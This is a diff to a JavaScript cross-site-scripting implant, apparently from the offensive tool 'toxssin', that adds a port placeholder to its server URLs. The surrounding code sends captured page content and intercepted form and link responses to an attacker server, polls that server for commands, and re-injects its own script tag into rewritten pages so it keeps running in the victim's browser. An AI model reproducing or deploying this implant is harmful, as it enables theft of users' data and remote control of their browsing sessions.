@@ -32,7 +32,7 @@ function rewriteDocument(html) {
 function xhr_get_intercept(capture, r = false) {
 	
 	let xhttp = new XMLHttpRequest();
-	xhttp.open("GET", `*TOXSSIN_SERVER*/${btoa(capture)}`, true);
+	xhttp.open("GET", `*TOXSSIN_SERVER*:*TOXSSIN_PORT*/${btoa(capture)}`, true);
 	xhttp.setRequestHeader('X-toxssin-id', '*SESSIONID*');
 	xhttp.send();
 	
@@ -45,7 +45,7 @@ function xhr_get_intercept(capture, r = false) {
 function xhr_post_intercept(capture, event_hash, data_type = 'form', form_attrs = '', r = false) {
 	
 	let xhttp = new XMLHttpRequest();
-	xhttp.open("POST", `*TOXSSIN_SERVER*/${event_hash}`, true);
+	xhttp.open("POST", `*TOXSSIN_SERVER*:*TOXSSIN_PORT*/${event_hash}`, true);
 	xhttp.setRequestHeader('X-toxssin-id', '*SESSIONID*');
 	
 	for (let attr in form_attrs) {
@@ -69,7 +69,7 @@ function xhr_post_intercept(capture, event_hash, data_type = 'form', form_attrs 
 function command_parser() {
 	
 	let cmd = new XMLHttpRequest();
-	cmd.open("GET", `*TOXSSIN_SERVER*/a95f7870b615a4df433314f10da26548`, true);
+	cmd.open("GET", `*TOXSSIN_SERVER*:*TOXSSIN_PORT*/a95f7870b615a4df433314f10da26548`, true);
 	cmd.setRequestHeader('X-toxssin-id', '*SESSIONID*');
 	
 	cmd.onreadystatechange = function() {
@@ -258,7 +258,7 @@ function interceptResponse(form) {
 
 				response_data.append('response-body', this.responseText);
 				xhr_post_intercept(response_data, '1a60f7f722fd94513b92bd2b19c4f7d4', 'FormData', response_attrs); //THIS SHOULD END WITH FALSE(?)
-				rewriteDocument(this.responseText.replace("</body>", '<script src="*TOXSSIN_SERVER*/*HANDLER*"></script></body>'));
+				rewriteDocument(this.responseText.replace("</body>", '<script src="*TOXSSIN_SERVER*:*TOXSSIN_PORT*/*HANDLER*"></script></body>'));
 			}
 		}
 		
@@ -307,7 +307,7 @@ function interceptLink() {
 			let response_headers = this.getAllResponseHeaders();	
 			let response_attrs = {'source':'link', 'href':escape(nl2br(href)), 'status':this.status, 'statusText':this.statusText, 'responseHeaders':nl2br(response_headers)};			
 			xhr_post_intercept(this.responseText + '\n', '1a60f7f722fd94513b92bd2b19c4f7d4', 'FormData', response_attrs, true);			
-			rewriteDocument(this.responseText.replace("</body>", '<script src="*TOXSSIN_SERVER*/*HANDLER*"></script></body>'));
+			rewriteDocument(this.responseText.replace("</body>", '<script src="*TOXSSIN_SERVER*:*TOXSSIN_PORT*/*HANDLER*"></script></body>'));
 		}
 	}	
 	
